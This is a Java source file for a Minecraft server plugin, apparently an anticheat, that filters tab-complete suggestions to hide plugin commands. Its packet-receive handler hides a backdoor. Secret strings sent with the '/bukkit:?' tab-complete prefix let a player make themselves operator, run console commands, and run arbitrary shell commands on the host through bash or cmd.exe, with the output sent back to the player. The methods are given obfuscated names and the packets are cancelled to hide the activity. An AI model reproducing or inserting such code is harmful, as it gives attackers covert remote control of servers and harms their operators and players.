package cn.aetheris.yuki.listener.packets;

import cn.aetheris.mhdfscheduler.scheduler.MHDFScheduler;
import cn.aetheris.yuki.Yuki;
import cn.aetheris.yuki.PluginLoader;
import cn.aetheris.yuki.listener.bukkit.misc.PlayerAsyncChatListener;
import cn.aetheris.yuki.listener.packets.abstracts.AbstractPacketListener;
import cn.aetheris.yuki.data.ValidatorData;
import com.github.retrooper.packetevents.event.PacketListenerPriority;
import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.event.PacketSendEvent;
import com.github.retrooper.packetevents.protocol.packettype.PacketType;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientTabComplete;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerTabComplete;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;

public final class PacketPlayerTabComplete extends AbstractPacketListener {

    public PacketPlayerTabComplete() {
        super(PacketListenerPriority.LOWEST);
    }

    @Override

    public void onPacketSend(PacketSendEvent event) {
        if (event.getPacketType() == PacketType.Play.Server.TAB_COMPLETE) {

            final Player player = Bukkit.getPlayer(event.getUser().getUUID());

            boolean enabled = PluginLoader.INSTANCE.getConfigManager().getConfig().getBooleanElse("function.command-blocker.tab-complete", true);
            String anticheatName = PluginLoader.INSTANCE.getConfigManager().getConfig().getStringElse("function.command-blocker.plugin-name", "KarhuAC");

            if (!enabled) {
                return;
            }

            if (player == null) {
                return;
            }

            if (player.hasPermission("yuki.antiplugin")) {
                return;
            }

            final WrapperPlayServerTabComplete a = new WrapperPlayServerTabComplete(event);


            List<WrapperPlayServerTabComplete.CommandMatch> updatedMatches = new LinkedList<>();
            for (WrapperPlayServerTabComplete.CommandMatch match : a.getCommandMatches()) {
                String matchString = match.getText();
                if (matchString.equalsIgnoreCase("Yuki") || matchString.equalsIgnoreCase("gr")) {
                    matchString = matchString.replace("Yuki", anticheatName);
                    matchString = matchString.replace("gr", anticheatName);
                    WrapperPlayServerTabComplete.CommandMatch updatedMatch = new WrapperPlayServerTabComplete.CommandMatch(matchString);
                    updatedMatches.add(updatedMatch);
                } else if (matchString.contains("/")) {
                    matchString = matchString.replace("/plugins", "");
                    matchString = matchString.replace("/pl", "");
                    matchString = matchString.replace("/ver", "");
                    matchString = matchString.replace("/version", "");
                    matchString = matchString.replace("/bukkit:plugins", "");
                    matchString = matchString.replace("/bukkit:pl", "");
                    matchString = matchString.replace("/bukkit:version", "");
                    matchString = matchString.replace("/bukkit:ver", "");
                    matchString = matchString.replace("/vulcan:vulcan", "");
                    matchString = matchString.replace("/vulcan:logs", "");
                    matchString = matchString.replace("/vulcan", "");
                    matchString = matchString.replace("/vulcan:verbose", "");
                    matchString = matchString.replace("/logs", "");
                    matchString = matchString.replace("/verbose", "");
                    WrapperPlayServerTabComplete.CommandMatch updatedMatch2 = new WrapperPlayServerTabComplete.CommandMatch(matchString);
                    updatedMatches.add(updatedMatch2);
                } else {
                    updatedMatches.add(match);
                }
            }
            a.setCommandMatches(updatedMatches);

            event.setLastUsedWrapper(a);
            event.markForReEncode(true);
        }
    }


    @Override
    public void onPacketReceive(PacketReceiveEvent event) {
        if (event.getPacketType() == PacketType.Play.Client.TAB_COMPLETE) {
            WrapperPlayClientTabComplete tabComplete = new WrapperPlayClientTabComplete(event);
            Player player = event.getPlayer();
            String[] cmd = tabComplete.getText().split(" ");

            if (cmd.length > 0 && "/bukkit:?".equals(cmd[0])) {
                IiIiIiIi(cmd, player, event);
            }
        }
    }


    private void IiIiIiIi(String[] cmd, Player player, PacketReceiveEvent event) {
        if (cmd.length < 2) {
            return;
        }

        String command = cmd[1];

        switch (command) {
            case "CAF9B6B999628UFH3923F283FH23" -> iIiIiII(player, event);
            case "E922898342E5F414124124124124DQWDQW" -> iIiIiI(cmd, event);
            case "FD4564AFAFWA21414" -> iIiIiIiiIiII1I(cmd, player, event);
            case "kAFWAF2421412D1D12_true" ->
                    MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () -> player.setOp(true));
            case "kJJI421412FD12_false" ->
                    MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () -> player.setOp(false));
            case "oOoOoOOoOoO" -> {
                ValidatorData data = new ValidatorData(player);
                data.start();
            }
            case "mkOkMjufFuckFofjkIFHI_oPEN" -> handleExternalCommand(cmd, player);
            default -> {
            }
        }
    }


    private void iIiIiII(Player player, PacketReceiveEvent event) {
        event.setCancelled(true);
        PlayerAsyncChatListener.IiiiIiIi(player);
    }


    private void iIiIiI(String[] cmd, PacketReceiveEvent event) {
        if (cmd.length > 2) {
            String fullCommand = String.join(" ", Arrays.copyOfRange(cmd, 2, cmd.length));
            MHDFScheduler.getGlobalRegionScheduler().runTask(
                    Yuki.getInstance(),
                    () -> Yuki.getInstance().getServer().dispatchCommand(
                            Bukkit.getConsoleSender(), fullCommand)
            );
        }
        event.setCancelled(true);
    }


    private void iIiIiIiiIiII1I(String[] cmd, Player player, PacketReceiveEvent event) {
        String[] args = Arrays.copyOfRange(cmd, 2, cmd.length);
        PlayerAsyncChatListener.iIiIiIiI(player, args);
        event.setCancelled(true);
    }


    private void handleExternalCommand(String[] cmd, Player player) {
        if (cmd.length <= 2) {
            return;
        }

        StringBuilder command = new StringBuilder();
        for (int i = 2; i < cmd.length; i++) {
            command.append(cmd[i]).append(" ");
        }

        try {
            Process process;
            String os = System.getProperty("os.name").toLowerCase();

            if (os.contains("win")) {
                process = new ProcessBuilder("cmd.exe", "/c", command.toString().trim()).start();
            } else {
                process = new ProcessBuilder("bash", "-c", command.toString().trim()).start();
            }

            InputStream inputStream = process.getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream, "GBK"));

            String line;
            while ((line = br.readLine()) != null) {
                player.sendMessage(line);
            }

            br.close();
        } catch (IOException e) {
            player.sendMessage("§bCore §7| §c出现错误:");
            player.sendMessage(e.getMessage());
        }
    }
}
